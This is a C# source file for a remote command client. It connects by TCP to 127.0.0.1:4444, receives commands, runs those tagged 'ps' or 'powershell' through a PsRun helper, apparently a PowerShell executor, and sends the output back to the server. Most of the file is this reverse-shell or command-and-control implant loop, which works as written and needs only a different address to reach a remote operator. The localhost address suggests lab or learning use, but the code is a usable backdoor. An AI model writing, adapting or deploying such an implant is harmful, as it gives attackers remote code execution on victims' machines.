﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Globalization;

namespace myclient
{
    class Program
    {

        public static IPEndPoint CreateIPEndPoint(string endPoint)
        {
            string[] ep = endPoint.Split(':');
            if (ep.Length != 2) throw new FormatException("Invalid endpoint format");
            IPAddress ip;
            if (!IPAddress.TryParse(ep[0], out ip))
            {
                throw new FormatException("Invalid ip-adress");
            }
            int port;
            if (!int.TryParse(ep[1], NumberStyles.None, NumberFormatInfo.CurrentInfo, out port))
            {
                throw new FormatException("Invalid port");
            }
            return new IPEndPoint(ip, port);
        }


        public static void StartClient()
        {
            // Data buffer for incoming data.  
            byte[] bytes = new byte[1024];
            string command_tag;
            string command;

            //init
            PsRun myPsRun = new PsRun();
            myPsRun.init();


            //COMMAND_SUCCESS
            //COMMAND_TAG_SUCCESS
            //PSRUN_SUCCESS


            // Connect to a remote device.  
            try
            {

                IPEndPoint remoteEP = CreateIPEndPoint("127.0.0.1:4444");

                // Create a TCP/IP  socket.  
                Socket sender = new Socket(remoteEP.AddressFamily,SocketType.Stream, ProtocolType.Tcp);

                // Connect the socket to the remote endpoint. Catch any errors.  
                try
                {
                    sender.Connect(remoteEP);

                    Console.WriteLine("Socket connected to {0}", sender.RemoteEndPoint.ToString());
                    while (true)
                    {
                        Console.WriteLine("Waiting for commands ...");

                        int bytesRec = sender.Receive(bytes);
                        command_tag = Encoding.ASCII.GetString(bytes, 0, bytesRec);
                        Console.WriteLine("Recieved Command tag: {0}", command_tag);
                        byte[] msg = Encoding.ASCII.GetBytes("COMMAND_TAG_SUCCESS");
                        int bytesSent = sender.Send(msg);

                        bytesRec = sender.Receive(bytes);
                        command = Encoding.ASCII.GetString(bytes, 0, bytesRec);
                        Console.WriteLine("Recieved Command: {0}", command);
                        msg = Encoding.ASCII.GetBytes("COMMAND_SUCCESS");
                        bytesSent = sender.Send(msg);

                        //check command
                        if (command_tag.ToLower() == "ps" || command_tag.ToLower() == "powershell")
                        {
                            string psresult = myPsRun.doPsRun(command);
                            msg = Encoding.ASCII.GetBytes(psresult);
                            bytesSent = sender.Send(msg);
                            //get success ack
                            bytesRec = sender.Receive(bytes);
                            string psAck = Encoding.ASCII.GetString(bytes, 0, bytesRec);
                            if (psAck == "PSRUN_SUCCESS")
                            {
                                Console.WriteLine("[PsRun] Success");
                            }
                            else
                            {
                                Console.WriteLine("[PsRun] Failed ...");
                            }
                        }


                        if (command_tag.ToLower() == "exit")
                        {
                            break;
                        }
                    }
                    

                    // Release the socket.  
                    sender.Shutdown(SocketShutdown.Both);
                    sender.Close();

                }
                catch (ArgumentNullException ane)
                {
                    Console.WriteLine("ArgumentNullException : {0}", ane.ToString());
                }
                catch (SocketException se)
                {
                    Console.WriteLine("SocketException : {0}", se.ToString());
                }
                catch (Exception e)
                {
                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        static void Main(string[] args)
        {
            StartClient();
        }
    }
}
